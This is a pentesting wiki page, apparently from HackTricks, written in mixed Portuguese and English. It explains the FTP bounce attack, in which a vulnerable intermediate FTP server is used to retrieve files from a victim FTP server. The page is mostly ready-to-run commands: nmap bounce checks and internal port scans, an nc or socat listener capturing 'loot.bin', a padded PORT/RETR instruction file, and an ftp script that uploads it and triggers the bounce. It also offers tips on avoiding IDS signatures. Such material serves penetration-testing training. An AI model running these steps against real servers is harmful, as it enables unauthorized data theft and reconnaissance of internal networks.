# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Resume

Se você tem acesso a um **bounce FTP server**, pode fazê‑lo solicitar arquivos de **another FTP server** (onde você conhece algumas credenciais) e baixar esse arquivo para **your own server**.

## Requirements

- FTP valid credentials in the **FTP Middle server**
- FTP valid credentials in **Victim FTP server**
- Both servers **accept the `PORT` command** (bounce FTP attack)
- You can **write** inside some directory of the **FTP Middle server**
- The middle server has **more access** inside the Victim FTP Server than you

## Steps

1. Conecte‑se ao **your own FTP server** e coloque a conexão em passive (`pasv` command) para que ele **escute** em um diretório onde o serviço vítima enviará o arquivo.
2. Crie o arquivo que o FTP Middle server enviará ao Victim server (o **exploit script**). Esse arquivo será texto simples com os comandos necessários para autenticar contra o Victim server, mudar o diretório e baixar um arquivo para o seu próprio servidor.
3. Conecte‑se ao **FTP Middle Server** e faça o upload do arquivo anterior.
4. Faça o FTP Middle server **estabelecer uma conexão** com o Victim server e enviar o exploit file.
5. **Capture** o arquivo no seu próprio FTP server.
6. **Delete** o exploit file do FTP Middle server.

## Quick check for vulnerable bounce hosts

- **Nmap** still supports FTP bounce checks. Example to verify a potential middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
If the server refuses third‑party `PORT` values the scan will fail; some **embedded/legacy printers, NAS and appliance FTP daemons** still allow it.

## Automatizando o 2º download via FTP

Abaixo está uma forma modernizada de obter um arquivo por meio de um servidor FTP intermediário vulnerável.

1. **Abra um listener passivo** na sua máquina de ataque (any TCP sink works):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Anote** seu IP como `A,B,C,D` e a porta `P` como `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Construa o arquivo de instruções** que o servidor intermediário irá reproduzir para a vítima:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Faça o upload & dispare a partir do servidor intermediário** (proxy FTP clássico):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Recupere o arquivo** do seu listener (`loot.bin`).
6. **Remova** o arquivo `instrs` enviado no servidor intermediário.

Notes:
- Padding (`dd ...`) evita que a conexão de controle seja fechada antes do RETR terminar (problema de janela TCP grande discutido em writeups clássicos).
- Any service that can **listen and dump TCP** can replace the FTP PASV socket (e.g., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Se o servidor intermediário restringir portas privilegiadas, use uma porta alta em `PORT` e ajuste seu listener adequadamente.

## Truques extras

- Use um servidor FTP bounceable para **port-scan hosts internos** quando o relay de arquivos estiver bloqueado:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Alguns WAF/IDS modernos (ex.: Juniper IPS) trazem assinaturas especificamente para **FTP:EXPLOIT:BOUNCE-ATTACK**; payloads barulhentos ou padding ausente podem acioná‑los.
- Quando o servidor intermediário aplicar restrições de "PORT to same host", coloque seu **listener no próprio servidor intermediário** (se você tiver write/execute) e encaminhe o arquivo capturado depois.

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
